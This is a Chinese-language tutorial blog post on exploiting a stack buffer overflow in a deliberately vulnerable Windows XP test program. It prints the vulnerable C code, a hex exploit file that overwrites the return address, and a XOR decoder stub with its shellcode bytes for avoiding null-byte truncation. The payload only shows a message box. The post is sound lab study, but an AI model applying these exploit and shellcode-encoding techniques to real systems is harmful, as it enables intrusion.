---
layout: post
title: Windows Shellcode学习笔记——shellcode在栈溢出中的利用与优化
---


## 0x00 前言
---

在[《Windows Shellcode学习笔记——shellcode的提取与测试》](https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95/)中介绍了如何对shellcode作初步优化，动态获取Windows API地址并调用，并通过程序实现自动提取机器码作为shellcode并保存到文件中。

弹框实例shellcode的bin文件已上传至github，地址如下：

https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.bin

**注：**

shellcode.bin由getshellcode.cpp生成

getshellcode.cpp地址如下：

https://github.com/3gstudent/Shellcode-Generater/blob/master/getshellcode.cpp


接下来，要研究shellcode在具体环境中的使用和优化技巧


## 0x01 简介
---

先从最入门的缓冲区溢出开始

本文将要结合《0day安全：软件漏洞分析技术》中的“栈溢出原理与实践”章节，以其中的栈溢出代码作样本，优化我们自己生成的弹框实例shellcode，实现在栈溢出中的初步利用。


## 0x02 相关概念
---

### 栈区：

用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行

### 特殊寄存器：

ESP:栈指针寄存器(extended stack pointer)，指向栈顶

EBP:基址指针寄存器(extended base pointer)，指向栈底

EIP:指令寄存器(extended instruction pointer)，指向下一条等待执行的指令地址

**函数代码在栈中保存顺序(直观理解，已省略其他细节)：**

- buffer
- 前栈帧EBP
- 返回地址
- ESP

**函数栈溢出原理(直观理解，已省略其他细节)：**

正常情况下函数在返回过程中，最后会执行返回地址中保存的内容，通常是跳到下一条指令的地址

如果buffer长度过长，长到覆盖了返回地址的值，那么函数在返回时，就会执行被覆盖的内容

如果将shellcode保存到buffer中，覆盖的返回地址为shellcode的起始地址，那么，shellcode将得到执行，完成栈溢出的利用


## 0x03 栈溢出实例测试
---


样本代码如下：

```
#include <stdio.h>
#include <windows.h>
#define PASSWORD "1234567"

int verify_password (char *password)
{
	int authenticated;
	char buffer[44];
	authenticated=strcmp(password,PASSWORD);
	strcpy(buffer,password);
	return authenticated;
}

int main()
{
	int valid_flag=0;
	char password[1024];
	FILE *fp;
	LoadLibrary("user32.dll");
	if(!(fp=fopen("password.txt","rw+")))
		return 0;
	fread(password,56,1,fp);
	valid_flag=verify_password(password);
	if(valid_flag)
	{
		printf("wrong\n");
	}
	else
	{
		printf("right\n");	
	}
	fclose(fp);
	return 0;
}
```

**注：**

代码选自章节2.4.2中的实验代码，作细微调整
其中
fscanf(fp,"%s",password)在遇到空格和换行符时结束，如果shellcode中包含空格(0x20)，会被截断，导致读取文件不完整

因此，将其替换为fread(password,56,1,fp);



数组password长度为56，数组buffer长度为44，在执行strcpy(buffer,password);时存在栈溢出


根据函数栈溢出原理，实现栈溢出需要以下过程：

(1) 分析并调试程序，获得淹没返回地址的偏移

(2) 获得buffer的起始地址，根据获得的偏移将其覆盖返回地址，使得函数返回时执行buffer起始地址保存的代码

(3) 提取弹框操作的机器码并保存于buffer的起始地址处，在函数返回时得到执行


```
测试系统：Win XP

编译器：VC6.0

build版本： debug版本
```

**(1) 分析并调试程序，获得淹没返回地址的偏移**

可在password.txt中填入56个测试字符，使用OllyDbg打开程序，定位到函数返回地址


如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-0.png)

返回地址刚好被覆盖


**(2) 获得buffer的起始地址并覆盖返回地址**

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-1.png)

获得buffer的起始地址：`0012FB7C`

**注：**

在不同系统下buffer的起始地址不同

使用0012FB7C覆盖返回地址，即password.txt的53-56位的十六进制字符为7CFB1200(逆序保存)

**(3) 提取弹框操作的机器码**

参照《0day安全：软件漏洞分析技术》中的方法，使用Dependency Walker 获取ueser32.ll的基地址为0x77D10000
MessageBoxA的偏移地址为0x000407EA

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-2.png)

因此MessageBoxA在该系统上内存中的入口地址为0x77D10000+0x000407EA=0x77D507EA

替换书中MessageBoxA对应函数入口地址的机器码

最终password.txt内容如下(十六进制视图)：

00000000h: 33 DB 53 68 77 65 73 74 68 66 61 69 6C 8B C4 53 ; 3跾hwesthfail嬆S
00000010h: 50 50 53 B8 EA 07 D5 77 FF D0 90 90 90 90 90 90 ; PPS戈.誻袗悙悙?
00000020h: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 ; 悙悙悙悙悙悙悙悙
00000030h: 90 90 90 90 7C FB 12 00                         ; 悙悙|?.



最终程序运行如图，栈溢出在我们的测试系统上触发成功

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-3.png)

## 0x03 弹框实例shellcode在栈溢出的优化
---

上节简单介绍了一下栈溢出实例的原理和操作方法，本节将要介绍如何优化我们自己开发的shellcode，即弹框实例shellcode，结合具体漏洞，实现利用


弹框实例shellcode下载地址：

https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.bin


shellcode长度1536


**(1) 修改实例程序，使其数组足以保存我们的shellcode**

完整代码如下：

```
#include <stdio.h>
#include <windows.h>
#define PASSWORD "1234567"

int verify_password (char *password)
{
	int authenticated;
	char buffer[1556];
	authenticated=strcmp(password,PASSWORD);
	strcpy(buffer,password);
	return authenticated;
}

int main()
{
	int valid_flag=0;
	char password[2048]={0};
	FILE *fp;
	if(!(fp=fopen("password2.txt","rb")))
		return 0;
	fread(password,1568,1,fp);
	valid_flag=verify_password(password);
	if(valid_flag)
	{
		printf("wrong\n");
	}
	else
	{
		printf("right\n");
	}
	fclose(fp);
	return 0;
}
```

buffer长度增大到1556，用于保存弹框实例shellcode

根据上节实例，淹没返回地址的偏移9-12，因此password的长度增加到1556+12=1568


**(2) strcpy遇到字符00会截断**


如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-4.png)

弹框实例shellcode在00000009h处字符为0x00，strcpy在执行时遇到0x00会提前截断，导致shellcode不完整，无法覆盖返回地址

所以，需要对shellcode进行编码


为方便读者理解，参照《0day安全：软件漏洞分析技术》中3.5.2节的方法(此章节有详细说明，不再赘述过程)：

- shellcode尾部添加结束字符0x90
- 将shellcode逐字节同0x44作异或加密
- 汇编实现解码器并提取机器码
- 解码器的机器码放于shellcode首部
- 解码器将EAX对准shellcode起始位置，逐字节同0x44异或进行解密，遇到0x90停止

解码器的汇编代码如下：

```
void main()
{
	__asm
	{
		add eax,0x14
		xor ecx,ecx
decode_loop:
		mov bl,[eax+ecx]
		xor bl,0x44
		mov [eax+ecx],bl
		inc ecx
		cmp bl,0x90
		jne decode_loop
	}
}
```

使用OllyDbg提取出机器码如下：

`"\x83\xC0\x14\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x90\x75\xF1"`

新的shellcode格式如下：

解码器机器码+加密的弹框实例`shellcode+0xD4+"\x90\x90\x90\x90\x90\x90\x90"+"\x7C\xFB\x12\x00"`

**注：**

0x90^0x44=0xD4,0xD4即编码后的结束字符

"\x90\x90\x90\x90\x90\x90\x90"为填充字符串，无意义

"\x7C\xFB\x12\x00"为覆盖的函数返回地址


**(3) 0xD4冲突**

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-5.png)

弹框实例shellcode中也包含结束字符0xD4，解密时shellcode会被提前截断，所以需要选择一个新的结束字符

当然也可以对shellcode分段加密，针对此shellcode，恰巧0xD5未出现，因此使用0xD5作结束字符串即可，解密字符为0x91



修改后的机器码如下：

`"\x83\xC0\x14\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1"`

修改后的shellcode格式如下：

`解码器机器码+加密的弹框实例shellcode+0xD5+"\x90\x90\x90\x90\x90\x90\x90"+"\x7C\xFB\x12\x00"`



**(4) shellcode编码测试**

编写程序实现自动读取原shellcode，加密，添加解密机器码，添加结束字符


程序已上传至github

https://github.com/3gstudent/Shellcode-Generater/blob/master/enshellcode.cpp

执行后如图，产生新的shellcode文件，并在屏幕输出c格式的shellcode

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-6.png)

使用如下代码，结合屏幕输出c格式的shellcode，替换数组内容，对新的加密shellcode测试

由于代码较长，所以上传至github，地址如下：

https://github.com/3gstudent/Shellcode-Generater/blob/master/testenshellcode.cpp

如图，shellcode执行，成功实现解码器

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-7.png)

**(5) 新shellcode在栈溢出中的测试**

填上解码器机器码，完整的shellcode格式如下：

`"\x83\xC0\x14\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1"+加密的弹框实例shellcode+0xD5+"\x90\x90\x90\x90\x90\x90\x90"+"\x7C\xFB\x12\x00"`

在栈溢出测试程序中仍然报错，使用OllyDbg加载继续调试


如下图，成功覆盖函数返回地址，接着按F8进行单步调试

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-8.png)

如下图，此时发现异常，EAX寄存器的值为909090D5，正常情况下EAX的值应该为Buffer的起始地址，这样才能成功找到shellcode并对其解密

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-9.png)

而寄存器EDX却保存了Buffer的起始地址

所以，我们需要对解码器作修改

**(6) 修改解码器**

选择一个最简单直接的方法，将EDX对准shellcode的起始位置，实现的汇编代码如下：


```
void main()
{
	__asm
	{
		add edx,0x14
		xor ecx,ecx
decode_loop:
		mov bl,[edx+ecx]
		xor bl,0x44
		mov [edx+ecx],bl
		inc ecx
		cmp bl,0x90
		jne decode_loop

	}
}
```

在OllyDbg中加载程序并提取机器码，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-10.png)

新的解码器机器码为：

`"\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1"  `



最终的shellcode代码为：

`"\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1"+加密的弹框实例shellcode+0xD5+"\x90\x90\x90\x90\x90\x90\x90"+"\x7C\xFB\x12\x00"`

完整shellcode代码已上传至github，地址为：

https://github.com/3gstudent/Shellcode-Generater/blob/master/stackoverflowshellcode.bin



再次测试栈溢出，如图，shellcode成功执行

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-11.png)

由于shellcode是我们自己实现的动态获取API地址，所以栈溢出测试程序中的LoadLibrary("user32.dll"); 可以省略

## 0x04 小结
---

本文对栈溢出原理作了简要描述，着重介绍了在具体的栈溢出环境下，shellcode的优化、调试和利用技巧 

当然，上述shellcode存在一个不足：shellcode在内存中的起始地址往往不固定，导致漏洞利用不一定成功

下一篇文章将要解决这个问题

---

[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)







